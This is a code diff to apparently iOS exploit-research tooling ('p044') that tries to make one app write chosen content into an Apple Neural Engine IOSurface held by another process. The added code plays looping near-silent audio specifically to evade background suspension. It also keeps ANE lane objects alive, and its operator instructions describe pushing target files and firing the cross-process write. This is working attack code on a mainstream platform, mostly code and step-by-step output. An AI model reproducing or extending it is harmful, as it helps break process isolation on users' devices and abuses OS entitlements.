@@ -139,6 +139,8 @@
 
 #import <Foundation/Foundation.h>
 #import <CoreML/CoreML.h>
+#import <AVFoundation/AVAudioPlayer.h>
+#import <AVFoundation/AVAudioSession.h>
 #import <fcntl.h>
 #import <mach/mach.h>
 #import <mach/arm/thread_status.h>
@@ -154,7 +156,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v65-census-hold"
+#define P044_BUILD @"p044-v66-keepalive"
 
 #define INPUT_COUNT 191
 #define PAYLOAD_SIZE 0xb80
@@ -512,6 +514,12 @@ static int       g_guestHoldANE; /* v64: guest ANE-hold — hold the request
    OUTPUT surface (consumer-mapped, shared-registry candidate) instead of
    a plain task-owned tile (round-1 control, note 166: plain holds do NOT
    resolve cross-process; ANE-mapped is the open class) */
+static id g_guestHoldAudio = nil; /* v66: silent looping AVAudioPlayer —
+   keeps this process UNSUSPENDED while backgrounded. The 11:58 accidental
+   simultaneous run (note 169): the standalone's census resolved the
+   guest's LIVE mid-tap request surfaces (545..736) cross-task, while
+   rounds 1-2 NULL'd with the guest backgrounded+SUSPENDED — suspension
+   (or ANE-lane teardown at cleanup) is the boundary, not surface class. */
 
 /* v48.1 _ANEClient lane state (file scope so cleanup can always release) */
 static id g_aneModelObj = nil;
@@ -519,6 +527,83 @@ static id g_aneClient = nil;
 static id g_aneReq = nil;
 static int g_aneModelOk = 0;
 static int g_aneReqOk = 0;
+
+/* v66: silent looping background audio (UIBackgroundModes: audio). Rounds
+   1-2 looked the hold up cross-task while this process was backgrounded
+   and SUSPENDED — lookup NULL. The 11:58 accidental simultaneous run
+   (note 169) proved LIVE mid-tap guest surfaces DO resolve cross-task
+   (standalone census resolved the guest's request sids 545..800).
+   Audio keeps this process unsuspended while the user switches to the
+   standalone app and fires, so the held OUTPUT surface stays registered
+   through the whole round. Volume 0.01 (not 0 — zero-volume playback can
+   be optimized out of the background entitlement), 8-bit silence, loops
+   forever. Stopped at the OBSERVE tap. */
+static void p044_guest_audio_start(NSMutableString *out)
+{
+    if (g_guestHoldAudio) return; /* already playing */
+    NSError *err = nil;
+    AVAudioSession *sess = [AVAudioSession sharedInstance];
+    [sess setCategory:AVAudioSessionCategoryPlayback
+              withOptions:AVAudioSessionCategoryOptionMixWithOthers
+                    error:&err];
+    [sess setActive:YES error:&err];
+    /* 1 s of unsigned 8-bit silence (0x80 midpoint), 8 kHz mono PCM WAV */
+    const uint32_t dataLen = 8000;
+    NSMutableData *wav = [NSMutableData dataWithCapacity:44 + dataLen];
+    uint32_t riffLen = 36 + dataLen;
+    [wav appendBytes:"RIFF" length:4];
+    [wav appendBytes:&riffLen length:4];
+    [wav appendBytes:"WAVE" length:4];
+    [wav appendBytes:"fmt " length:4];
+    uint32_t fmtSz = 16;
+    uint16_t audioFmt = 1, channels = 1, blockAlign = 1, bits = 8;
+    uint32_t sampleRate = 8000, byteRate = 8000;
+    [wav appendBytes:&fmtSz length:4];
+    [wav appendBytes:&audioFmt length:2];
+    [wav appendBytes:&channels length:2];
+    [wav appendBytes:&sampleRate length:4];
+    [wav appendBytes:&byteRate length:4];
+    [wav appendBytes:&blockAlign length:2];
+    [wav appendBytes:&bits length:2];
+    [wav appendBytes:"data" length:4];
+    [wav appendBytes:&dataLen length:4];
+    static uint8_t sil[8000];
+    memset(sil, 0x80, sizeof(sil));
+    [wav appendBytes:sil length:dataLen];
+    NSString *tmp = [NSTemporaryDirectory()
+        stringByAppendingPathComponent:@"p044_silence.wav"];
+    [wav writeToFile:tmp atomically:YES];
+    NSURL *u = [NSURL fileURLWithPath:tmp];
+    AVAudioPlayer *p = [[AVAudioPlayer alloc]
+        initWithContentsOfURL:u error:&err];
+    if (!p) {
+        [out appendFormat:@"  [v66] AUDIO START FAILED: %@\n",
+            err ? err.localizedDescription : (NSString *)@"init failed"];
+        return;
+    }
+    p.numberOfLoops = -1;
+    p.volume = 0.01;
+    [p prepareToPlay];
+    if ([p play]) {
+        g_guestHoldAudio = p;
+        [out appendString:@"  [v66] SILENT BACKGROUND AUDIO ON (looping silence, volume 0.01) — this process stays UNSUSPENDED while backgrounded\n"];
+    } else {
+        [out appendString:@"  [v66] AUDIO PLAY FAILED (process may suspend when backgrounded — keep the app foreground instead)\n"];
+    }
+}
+
+static void p044_guest_audio_stop(NSMutableString *out)
+{
+    if (!g_guestHoldAudio) return;
+    AVAudioPlayer *p = (AVAudioPlayer *)g_guestHoldAudio;
+    [p stop];
+    g_guestHoldAudio = nil;
+    NSError *err = nil;
+    [[AVAudioSession sharedInstance] setActive:NO
+                     withOptions:AVAudioSessionSetActiveOptionNotifyOthersOnDeactivation
+                                           error:&err];
+    [out appendString:@"  [v66] BACKGROUND AUDIO OFF (process may suspend again)\n"];
+}
 
 static void cls_reset(void) {
     g_cls_fp = g_cls_kptr = g_cls_kptr_tail = 0;
@@ -1967,6 +2052,19 @@ static void *watch_worker(void *arg) {
                 }
                 CFRelease(g_guestHold);
                 g_guestHold = NULL; g_guestHoldSid = 0;
+                /* v66: the observe tap is the end of the round — stop the
+                   background audio and release the ANE lane objects that
+                   cleanup kept alive for the hold. */
+                p044_guest_audio_stop(out);
+                if (g_guestHoldANE) {
+                    g_aneReq = nil;
+                    g_aneClient = nil;
+                    g_aneModelObj = nil;
+                    g_aneModelOk = 0;
+                    g_aneReqOk = 0;
+                    g_guestHoldANE = 0;
+                    [out appendString:@"  [v66] ANE lane released (hold observed; process may suspend again)\n"];
+                }
                 p044_write_log(out);
                 return out;
             }
@@ -3001,14 +3099,24 @@ static void *watch_worker(void *arg) {
         g_nSurf = 0;
         [out appendFormat:@"  forge surfaces released (%u)\n", released];
     }
-    g_aneReq = nil;
-    g_aneClient = nil;
-    g_aneModelObj = nil;
-    g_aneModelOk = 0;
-    g_aneReqOk = 0;
-    [out appendString:@"  _ANEClient lane released\n"];
     if (g_guestHold) {
-        [out appendFormat:@"\n=== v64 GUEST ANE HOLD: sid=%u (request OUTPUT surface — ANE consumer-mapped; held, NOT released) ===\n",
+        /* v66: hold active — KEEP the ANE lane objects (request/program
+           keeps the OUTPUT surface attached to a live ANE program; the
+           11:58 evidence says surfaces resolve cross-task while the
+           owner is alive — teardown releases them, released surfaces
+           may unbind from the shared registry). Lane objects are
+           released at the OBSERVE tap instead. */
+        [out appendString:@"  [v66] ANE lane KEPT ALIVE with the hold (request/program still attached; released at the OBSERVE tap)\n"];
+    } else {
+        g_aneReq = nil;
+        g_aneClient = nil;
+        g_aneModelObj = nil;
+        g_aneModelOk = 0;
+        g_aneReqOk = 0;
+        [out appendString:@"  _ANEClient lane released\n"];
+    }
+    if (g_guestHold) {
+        [out appendFormat:@"\n=== v66 GUEST ANE HOLD (keepalive): sid=%u (request OUTPUT surface — ANE consumer-mapped; held, NOT released; lane + audio keep this process ALIVE backgrounded) ===\n",
             g_guestHoldSid];
         if (p044_sfLock(g_guestHold, 1, NULL) == 0) {
             uint8_t *b = (uint8_t *)p044_sfBase(g_guestHold);
@@ -3021,8 +3129,8 @@ static void *watch_worker(void *arg) {
         } else {
             [out appendString:@"  pre-dump lock FAILED — surface dead at hold time; observe will say so.\n"];
         }
-        [out appendString:@"  KEEP THIS APP BACKGROUND-ALIVE (no force-quit). Push this sid as p044_target.txt into the STANDALONE app's Documents (house_arrest) + p044_fill.txt=<pattern e.g. 5eaf,4b1d> + p044_req_in.txt=127 + p044_model.txt=XVRC27_127in_copyout, tap the STANDALONE (its fire aims HERE), then return and tap with p044_guest.txt again (any content) to OBSERVE: p044_guest_after.bin showing the STANDALONE's chosen pattern at the base = CROSS-PROCESS CHOSEN-CONTENT WRITE into a GUEST-held surface.\n"];
-        g_guestHoldANE = 0;
+        p044_guest_audio_start(out);
+        [out appendString:@"  KEEP THIS APP BACKGROUND-ALIVE (no force-quit) — v66: silent background audio keeps it UNSUSPENDED while you switch away. Push this sid as p044_target.txt into the STANDALONE app's Documents (house_arrest) + p044_fill.txt=<pattern e.g. 5eaf,4b1d> + p044_req_in.txt=127 + p044_model.txt=XVRC27_127in_copyout, tap the STANDALONE (its fire aims HERE; decisive line: [v64] FILE-TARGET sid RESOLVES at 3a.5 rt=N), then return and tap with p044_guest.txt again (any content) to OBSERVE: p044_guest_after.bin showing the STANDALONE's chosen pattern at the base = CROSS-PROCESS CHOSEN-CONTENT WRITE into a GUEST-held surface (audio + lane released at observe).\n"];
     }
     [out appendString:@"  cleanup done (witnesses joined)\n"];
 
